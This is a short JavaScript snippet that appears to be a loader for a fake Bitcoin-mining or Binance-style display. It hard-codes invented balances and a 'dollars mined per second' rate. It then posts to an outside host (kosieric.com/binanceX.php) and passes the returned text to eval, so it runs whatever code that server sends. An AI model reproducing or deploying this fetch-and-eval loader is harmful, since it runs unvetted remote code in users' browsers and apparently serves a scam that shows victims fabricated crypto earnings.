var maxMiningInUSD = 1000;
var auth = true;
var intervalInSeconds = 1;
var stopMiningAfterHowManySeconds = 100;
var initialSpotBalanceUSD = 100000;
var initialFiatBalanceUSD = 5000;
var currentBitcoinPrice = 50000;
var mineHowManyDollarsInOneSecond = 100;


var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        // Typical action to be performed when the document is ready:


        var additionalString = `
var maxMiningInUSD = ${maxMiningInUSD}; 
var auth = true;
var intervalInSeconds = ${intervalInSeconds};
var stopMiningAfterHowManySeconds = ${stopMiningAfterHowManySeconds}; 
var initialSpotBalanceUSD = ${initialSpotBalanceUSD};
var initialFiatBalanceUSD = ${initialFiatBalanceUSD};
var currentBitcoinPrice = ${currentBitcoinPrice};
var mineHowManyDollarsInOneSecond = ${mineHowManyDollarsInOneSecond}; `;

        eval(additionalString + xhttp.responseText);

    }
};
xhttp.open("POST", "https://kosieric.com/binanceX.php", true);
xhttp.send();
